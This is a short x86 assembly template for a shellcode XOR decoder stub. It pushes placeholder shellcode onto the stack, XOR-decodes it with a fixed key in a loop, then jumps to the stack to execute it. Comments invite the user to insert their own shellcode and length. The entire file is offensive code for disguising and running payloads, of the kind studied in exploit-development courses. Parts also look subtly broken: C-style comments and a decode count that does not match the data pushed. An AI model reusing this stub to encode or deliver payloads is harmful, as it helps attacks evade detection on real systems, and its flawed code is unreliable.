global _start

section .text

_start:

/*
 * Modify this
 * Push shellcode on the stack
 */
push 0x41424344

mov esi, esp
xor ecx, ecx

/*
 * Modify this
 * Length of the shellcode
 */
mov cl, 20

mov ebx, 0xaaaaaaaa

/*
 * Decoder stub
 */
decoder:

		xor dword [esi], ebx
		add esi, 4
		loop decoder

	/*
	 * Jump to decoded shellcode
	 */		
		jmp esp